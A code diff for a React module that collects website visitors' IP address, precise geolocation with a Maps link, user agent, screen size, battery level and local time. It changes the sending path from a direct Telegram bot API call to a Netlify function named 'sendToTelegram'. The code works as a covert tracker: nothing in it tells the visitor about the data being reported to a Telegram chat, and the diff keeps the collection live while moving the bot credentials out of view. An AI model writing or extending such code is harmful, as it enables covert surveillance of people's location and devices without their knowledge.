@@ -1,6 +1,6 @@
 import React from 'react'
 
-const sendUserInfo = async () => {
+const prepareUserInfo = async () => {
   try {
     // 1. Generate unique user ID
     let newUser = false;
@@ -18,7 +18,6 @@ const sendUserInfo = async () => {
       const ipData = await ipRes.json();
       userIP = ipData.ip;
     } catch { }
-
 
     // 3. Ambil lokasi user
     const getLocation = () => {
@@ -65,43 +64,28 @@ const sendUserInfo = async () => {
     }
 
     // 7. Buat pesan Telegram
-    const message = `
-📲 *User Info Detected*
+    const message = {
+      userId,
+      newUser,
+      userIP,
+      gmapsLink,
+      latitude: location.latitude,
+      longitude: location.longitude,
+      accuracy: location.accuracy,
+      userAgent,
+      screenWidth,
+      screenHeight,
+      pixelRatio,
+      batteryLevel,
+      localTime,
+      timezone,
+    };
 
-🕐 Time: ${localTime}
-
-🆔 ID: ${userId} (new user: ${newUser})
-
-🌐 IP: ${userIP}
-
-📍 Location:
-  - GMaps Link: [Google Maps](${gmapsLink})
-  - Latitude: ${location.latitude}
-  - Longitude: ${location.longitude}
-  - Accuracy: ${location.accuracy} meters
-
-📱 Device Info:
-  - Battery level: ${batteryLevel}
-  - Screen: ${screenWidth}x${screenHeight}
-  - Pixel Ratio: ${pixelRatio}
-  - User Agent: \`\`\`${userAgent}\`\`\`
-`;
-
-    // 8. Kirim ke Telegram
-    const TELEGRAM_BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
-    const TELEGRAM_CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID;
-
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    // 8. Kirim ke backend Netlify Function
+    await fetch("/.netlify/functions/sendToTelegram", {
       method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message,
-        parse_mode: "Markdown",
-        disable_web_page_preview: true,
-      }),
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(message),
     });
 
   } catch (err) {
@@ -109,4 +93,4 @@ const sendUserInfo = async () => {
   }
 }
 
-export default sendUserInfo
+export default prepareUserInfo;
